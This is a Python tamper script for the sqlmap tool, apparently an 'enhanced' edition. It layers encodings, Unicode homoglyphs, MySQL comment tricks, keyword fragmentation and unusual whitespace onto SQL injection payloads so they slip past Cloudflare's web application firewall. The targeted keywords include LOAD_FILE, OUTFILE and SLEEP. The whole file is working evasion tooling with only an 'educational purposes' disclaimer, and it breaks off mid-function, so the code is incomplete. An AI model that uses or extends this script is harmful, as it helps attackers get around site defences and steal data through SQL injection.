#!/usr/bin/env python
"""
CloudFlare Ultimate WAF Bypass Tamper Script - SHANNON-Ω Enhanced Edition (Part 1/2)
Comprehensive evasion techniques collection with critical fixes and advanced logic.
For research and educational purposes only.
Original by KL3FT3Z (https://github.com/toxy4ny) - Enhanced by SHANNON-Ω
"""

import re
import random
import urllib.parse
import base64
import binascii
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.NORMAL

def dependencies():
    pass

def tamper(payload, **kwargs):
    """
    SHANNON-Ω Enhanced CloudFlare WAF bypass using 15+ advanced techniques
    with critical fixes, dynamic layering, and increased aggression.
    """

    if payload:
        # Dynamic iteration for deeper obfuscation
        for _ in range(random.randint(1, 3)): # Apply all phases 1 to 3 times
            # Phase 1: Encoding & Obfuscation
            payload = multi_layer_encoding(payload)
            payload = unicode_normalization_advanced(payload)
            payload = hex_encoding_selective(payload)

            # Phase 2: Structure Manipulation
            payload = advanced_comment_insertion(payload)
            payload = keyword_fragmentation_v2(payload)
            payload = nested_function_calls(payload)

            # Phase 3: Whitespace & Character Substitution
            payload = advanced_whitespace_substitution(payload)
            payload = character_width_manipulation(payload)
            payload = invisible_chars_insertion(payload)

            # Phase 4: SQL Syntax Manipulation
            payload = operator_alternatives(payload, **kwargs)
            payload = conditional_logic_wrapping(payload)
            payload = subquery_nesting(payload)

            # Phase 5: Advanced Evasion
            payload = json_xpath_injection(payload)
            payload = scientific_notation_numbers(payload)
            payload = charset_confusion(payload)
            # Phase 6: Final Obfuscation
            payload = dynamic_case_mutation(payload)
            payload = redundant_parentheses(payload)
            payload = null_byte_insertion(payload)

    return payload

def multi_layer_encoding(payload):
    """
    Multiple encoding layers with selective application - Enhanced probability
    """
    encoding_targets = {
        "'": ["%27", "%2527", "%252527", "%u0027", "\\x27", "''"],
        '"': ["%22", "%2522", "%252522", "%u0022", "\\x22", "\"\""],
        " ": ["%20", "%2520", "%252520", "+", "%09", "%0a", "%0d"],
        "(": ["%28", "%2528", "%u028", "\\x28"],
        ")": ["%29", "%2529", "%u0029", "\\x29"],
        "=": ["%3d", "%253d", "%u003d", "\\x3d"],
        "<": ["%3c", "%253c", "%u003c", "\\x3c", "&lt;"],
        ">": ["%3e", "%253e", "%u003e", "\\x3e", "&gt;"],
        "&": ["%26", "%2526", "%u0026", "&amp;"],
        "#": ["%23", "%2523", "%u0023"],
        "\\": ["%5c", "%255c", "%u005c", "\\\\"],
        "/": ["%2f", "%252f", "%u002f"]
    }
    result = ""
    for char in payload:
        if char in encoding_targets and random.choice([True, True, False]):
            result += random.choice(encoding_targets[char])
        else:
            result += char
    return result

def unicode_normalization_advanced(payload):
    """
    Advanced Unicode normalization bypass with homoglyphs
    """
    unicode_alternatives = {
        'a': ['a', 'а', 'ạ', 'ȧ', 'ā', 'ă', 'ą', 'ä', 'ɑ'],
        'e': ['e', 'е', 'ė', 'ē', 'ĕ', 'ę', 'ë', 'ҽ'],
        'i': ['i', 'і', 'ı', 'ì', 'í', 'î', 'ï', 'ī', 'ɨ'],
        'o': ['o', 'о', 'ō', 'ŏ', 'ő', 'ơ', 'ö', 'ò', 'ο'],
        'u': ['u', 'υ', 'ū', 'ŭ', 'ů', 'ű', 'ų', 'ü', 'ʉ'],
        'n': ['n', 'п', 'ñ', 'ń', 'ň', 'ņ', 'ŋ', 'ո'],
        'r': ['r', 'г', 'ŕ', 'ř', 'ŗ', 'ȑ', 'ȓ', 'ɼ'],
        's': ['s', 'ѕ', 'ś', 'š', 'ş', 'ș', 'ș', 'ʂ'],
        't': ['t', 'т', 'ţ', 'ț', 'ť', 'ŧ', '†'],
        'p': ['p', 'р', 'ṗ', 'ṕ', 'р'],
        'c': ['c', 'с', 'ć', 'č', 'ç', 'ċ', 'ĉ', 'ϲ'],
        'x': ['x', 'х', 'ẋ', 'ẍ', '×'],
        'y': ['y', 'у', 'ý', 'ÿ', 'ŷ', 'ẏ', 'ɣ']
    }

    result = ""
    for i, char in enumerate(payload):
        lower_char = char.lower()
        if lower_char in unicode_alternatives and random.choice([True, True, False]):
            result += random.choice(unicode_alternatives[lower_char])
        else:
            result += char
    return result

def hex_encoding_selective(payload):
    """
    Selective hexadecimal encoding for specific characters - Enhanced probability
    """
    hex_targets = ["'", '"', "<", ">", "&", "=", " ", "%"]

    result = ""
    for char in payload:
        if char in hex_targets and random.choice([True, True, False]):
            formats = [
                f"\\x{ord(char):02x}",
                f"\\u{ord(char):04x}",
                f"\\U{ord(char):08x}",
                f"&#x{ord(char):x};",
                f"&#{ord(char)};",
                f"%{ord(char):02x}",
                f"%u{ord(char):04x}",
                f"CHAR({ord(char)})"
            ]
            result += random.choice(formats)
        else:
            result += char
    return result

def advanced_comment_insertion(payload):
    """
    Advanced SQL comment insertion with various formats - More aggressive
    """
    comment_types = [
        "/**/", "/*! */", "/*!00000*/", "/*!12345*/",
        "/*!50000*/", "/*!50001*/", "/*!99999*/",
        "/*#*/", "/*--*/", "/*;*/", "/**_**/",
        "/*\x00*/", "/*\n*/", "/*\t*/", "/*\r*/",
        "/*\x0b*/", "/*\x0c*/", "/*\x0d*/", "/*\x08*/",
        "-- ", "-- -", "--+", "--/*", "#", ";%00",
        "/*!UNION*/", "/*!SELECT*/", "/*!FROM*/",
        "/**!**/", "/*`*/",
        "/*X*/", "/*Y*/", "/*Z*/"
    ]

    sql_keywords = [
        'SELECT', 'FROM', 'WHERE', 'UNION', 'AND', 'OR', 'ORDER', 'BY',
        'GROUP', 'HAVING', 'INSERT', 'UPDATE', 'DELETE', 'JOIN', 'LIMIT',
        'OFFSET', 'CASE', 'WHEN', 'THEN', 'ELSE', 'END', 'AS', 'LIKE',
        'BETWEEN', 'IN', 'EXISTS', 'ALL', 'ANY', 'SOME'
    ]
    sorted_keywords = sorted(sql_keywords, key=len, reverse=True)

    for keyword in sorted_keywords:
        while re.search(r'\b' + re.escape(keyword) + r'\b', payload, re.IGNORECASE):
            pattern = re.compile(r'\b' + re.escape(keyword) + r'\b', re.IGNORECASE)
            match = pattern.search(payload)
            if not match:
                break

            comment = random.choice(comment_types)
            positions = ['before', 'middle', 'after']
            position = random.choice(positions)

            start_idx, end_idx = match.span()
            current_keyword = payload[start_idx:end_idx]

            if position == 'before':
                replacement = f"{comment}{current_keyword}"
            elif position == 'middle' and len(current_keyword) > 2:
                mid = len(current_keyword) // 2
                replacement = f"{current_keyword[:mid]}{comment}{current_keyword[mid:]}"
            else:
                replacement = f"{current_keyword}{comment}"

            payload = payload[:start_idx] + replacement + payload[end_idx:]
            if len(replacement) == len(current_keyword):
                break

    return payload
# --- Start of Part 2: Append this to the file from Part 1 ---

def keyword_fragmentation_v2(payload):
    """
    Advanced keyword fragmentation with multiple insertion points - More aggressive
    """
    fragments = [
        "/**/", "/*!*/", "/*! */", "/*!12345*/", "/*!50000*/",
        "%00", "%0a", "%0d", "%09", "%20",
        "\x00", "\n", "\r", "\t", " ",
        "+", "-", "*", "/", "%",
        "||", "&&", "^^", "~~", "/*X*/", "/*Y*/", "/*Z*/",
        "`", "!", "~", "@"
    ]

    targets = [
        'CONCAT', 'SUBSTRING', 'LENGTH', 'ASCII', 'CHAR', 'ORD',
        'DATABASE', 'VERSION', 'USER', 'SCHEMA', 'TABLE_NAME',
        'COLUMN_NAME', 'INFORMATION_SCHEMA', 'CURRENT_USER',
        'SESSION_USER', 'SYSTEM_USER', 'LOAD_FILE', 'INTO',
        'OUTFILE', 'DUMPFILE', 'BENCHMARK', 'SLEEP', 'DELAY',
        'SELECT', 'FROM', 'WHERE', 'UNION', 'AND', 'OR'
    ]

    sorted_targets = sorted(targets, key=len, reverse=True)

    for target in sorted_targets:
        while re.search(re.escape(target), payload, re.IGNORECASE):
            pattern = re.compile(re.escape(target), re.IGNORECASE)
            match = pattern.search(payload)
            if not match:
                break

            original_target = match.group(0)
            temp_target = original_target
            fragmentation_count = random.randint(1, min(3, len(temp_target) - 1))

            for _ in range(fragmentation_count):
                if len(temp_target) <= 1:
                    break

                insert_pos = random.randint(1, len(temp_target) - 1)
                fragment = random.choice(fragments)
                temp_target = temp_target[:insert_pos] + fragment + temp_target[insert_pos:]

            payload = payload.replace(original_target, temp_target, 1)

    return payload


def nested_function_calls(payload):
    """
    Wrap SQL functions in nested calls to obfuscate - SHANNON-Ω Enhanced probability
    """
    function_wrappers = {
        'CONCAT': lambda x: f"CONCAT({x})",
        'CHAR': lambda x: f"CHAR({x})",
        'ASCII': lambda x: f"ASCII({x})",
        'LENGTH': lambda x: f"LENGTH({x})",
        'SUBSTRING': lambda x: f"SUBSTRING({x})",
        'REVERSE': lambda x: f"REVERSE({x})",
        'UPPER': lambda x: f"UPPER({x})",
        'LOWER': lambda x: f"LOWER({x})",
        'HEX': lambda x: f"HEX({x})",
        'UNHEX': lambda x: f"UNHEX({x})"
    }

    string_pattern = r"'([^']+)'"
    matches = list(re.finditer(string_pattern, payload))

    if matches:
        match = random.choice(matches)
        original = match.group(0)
        content = match.group(1)

        if random.choice([True, True, False]) and len(content) < 20:
            wrapper_name = random.choice(list(function_wrappers.keys()))

            if wrapper_name == 'CHAR':
                ascii_values = ','.join([str(ord(c)) for c in content])
                wrapped = f"CHAR({ascii_values})"
            else:
                wrapped = function_wrappers[wrapper_name](original)

            payload = payload[:match.start()] + wrapped + payload[match.end():]

    return payload

def advanced_whitespace_substitution(payload):
    """
    Advanced whitespace character substitution - Enhanced probability
    """
    whitespace_alternatives = [
        '\x09',     # Tab
        '\x0a',     # Line Feed
        '\x0b',     # Vertical Tab
        '\x0c',     # Form Feed
        '\x0d',     # Carriage Return
        '\x20',     # Space
        '\xa0',     # Non-breaking space
        '\u2000',   # En quad
        '\u2001',   # Em quad
        '\u2002',   # En space
        '\u2003',   # Em space
        '\u2004',   # Three-per-em space
        '\u2005',   # Four-per-em space
        '\u2006',   # Six-per-em space
        '\u2007',   # Figure space
        '\u2008',   # Punctuation space
        '\u2009',   # Thin space
        '\u200a',   # Hair space
        '\u3000',   # Ideographic space
        '/**/',     # Comment as whitespace
        '/*!*/',    # MySQL comment
        '+',        # Plus in some contexts
        '%20', '%09', '%0a', '%0d', # URL encoded whitespaces
        '/*!12345*/' # MySQL versioned comment
    ]

    result = ""
    for char in payload:
        if char == ' ' and random.choice([True, True, False]):
            result += random.choice(whitespace_alternatives)
        else:
            result += char
    return result

def character_width_manipulation(payload):
    """
    Randomly replaces ASCII characters with full-width (U+FF00-U+FFEF) or
    half-width (U+0020-U+007E) equivalents.
    """
    full_width_map = {
        ' ': '　', '!': '！', '"': '＂', '#': '＃', '$': '＄', '%': '％', '&': '＆', "'": '＇',

